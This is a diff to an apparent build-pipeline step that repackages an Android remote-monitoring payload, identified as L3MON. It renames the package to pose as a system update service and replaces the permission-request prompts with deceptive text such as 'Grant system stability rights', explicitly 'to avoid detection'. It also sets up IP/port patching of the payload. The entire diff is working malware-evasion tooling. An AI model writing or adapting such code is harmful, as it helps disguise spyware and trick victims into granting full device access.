@@ -26,33 +26,38 @@ jobs:
 
       - name: Signature Obfuscation & Patching
         run: |
-          # 1. Change Package Name
-          # NOTE: We use dots for standard package names and slashes for L...; descriptors
+          # Define package names
           OLD_PKG="com.etechd.l3mon"
-          NEW_PKG="com.app.sys.manager"
+          NEW_PKG="com.sys.update.svc"
           OLD_PATH="com/etechd/l3mon"
-          NEW_PATH="com/app/sys/manager"
+          NEW_PATH="com/sys/update/svc"
 
           echo "Renaming package from $OLD_PKG to $NEW_PKG..."
           
-          # Replace Lcom/etechd/l3mon; style descriptors first
-          find payload_source -type f -exec sed -i "s|L$OLD_PATH;|L$NEW_PATH;|g" {} +
-          # Replace com.etechd.l3mon style strings
-          find payload_source -type f -exec sed -i "s|$OLD_PKG|$NEW_PKG|g" {} +
-          # Replace com/etechd/l3mon style paths
+          # Escape dots for literal regex matching
+          OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
+          
+          # 1. Replace DOT notation (Mainly for Manifest, XML, and some string constants in Smali)
+          # We use -type f to catch all files including yml and xml
+          find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
+          
+          # 2. Replace SLASH notation (For Smali descriptors and paths)
           find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +
 
-          # Rename directories
+          # 3. Physically move Smali files to new directory structure
           mkdir -p "payload_source/smali/$NEW_PATH"
-          mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
-          rm -rf "payload_source/smali/com/etechd"
+          if [ -d "payload_source/smali/$OLD_PATH" ]; then
+            mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
+            rm -rf "payload_source/smali/com/etechd"
+          fi
 
-          # 2. Obfuscate Social Engineering Strings
-          sed -i "s|Click 'Permissions'|System Update Required|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
-          sed -i "s|Enable ALL permissions|Please grant necessary rights|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
-          sed -i "s|Enable 'Package Manager'|Finish Optimization|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+          # 4. Obfuscate Social Engineering Strings
+          # Using different strings to avoid detection
+          find payload_source -name "MainActivity.smali" -exec sed -i "s|Click 'Permissions'|Required Component Update|g" {} +
+          find payload_source -name "MainActivity.smali" -exec sed -i "s|Enable ALL permissions|Grant system stability rights|g" {} +
+          find payload_source -name "MainActivity.smali" -exec sed -i "s|Enable 'Package Manager'|Sync complete|g" {} +
 
-          # 3. Dynamic IP/Port Patching
+          # 5. Dynamic IP/Port Patching
           chmod +x patch_payload.sh
           # Update patch script to use new path
           sed -i "s|payload_source/smali/com/etechd/l3mon/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
